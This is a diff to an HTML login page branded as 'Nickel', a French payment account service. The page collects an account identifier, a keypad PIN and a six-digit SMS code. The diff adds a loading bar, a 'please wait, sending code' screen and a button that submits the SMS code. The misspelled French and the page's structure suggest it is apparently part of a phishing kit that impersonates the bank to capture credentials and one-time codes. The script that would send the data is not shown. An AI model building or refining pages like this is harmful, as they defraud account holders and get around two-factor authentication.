@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/dist/loading-bar.css">
     <meta name="description" content="Nickel - Login page">
     <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,maximum-scale=1,user-scalable=0">
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -161,6 +162,8 @@
                                         <strong class="custom">Identifiant:</strong>
                                         <a class="float-right linkc" href="">Ou trouver mon identifiant ?</a>
                                     </div>
+
+
                                     <br>
                                     <div class="form-group">
                                         <input id="codeValue" placeholder="XXX XXX XXX X" style="height: 50px; font-size: 33px"
@@ -243,6 +246,9 @@
                                         <button id="8" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">8</button>
                                         <button id="9" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">9</button>
                                     </div>
+
+                                    
+
                             
                                 </div>
                             
@@ -253,6 +259,13 @@
                                 <br><br>
                                 <a href='' class="linkc">Faire opposition</a> <br />
                             </div>
+                        </div>
+
+                        <div id="attente" style="display: none;">
+                            <div class="text-center">
+                                Envoie du code.... <br/>  <small>Veillez patienter</small> <br>
+                            </div>
+                            
                         </div>
                         <div id="twopage" style="display: none;">
                             <div class="text-center">
@@ -268,9 +281,12 @@
                                     <br>
                                     <div class="form-group">
                                         <input id="codeSms" placeholder="X X X X X X" style="height: 50px; font-size: 33px"
-                                            pattern="\d{6}" data-mask="999999" class='form-control'
-                                            onkeyup="smsVerify()" />
+                                            pattern="\d{6}" data-mask="999999" class='form-control' />
                                     </div>
+
+                                    
+
+                                    <button onClick="smsVerify()" class="btn btn-sm btn-primary">Valider</button>
                                 </div>
                                 <br>
                                 <a href='' class="linkc">Me renvoyer le code SMS</a>
@@ -288,6 +304,8 @@
 <script src="assets/js/jquery.js"></script>
 <script src="assets/js/bootstrap.min.js"></script>
 <script src="assets/js/jquery.mask.js"></script>
+<script src="assets/dist/loading-bar.js"></script>
+
 
 <script src="assets/js/App.js"></script>
 </body>
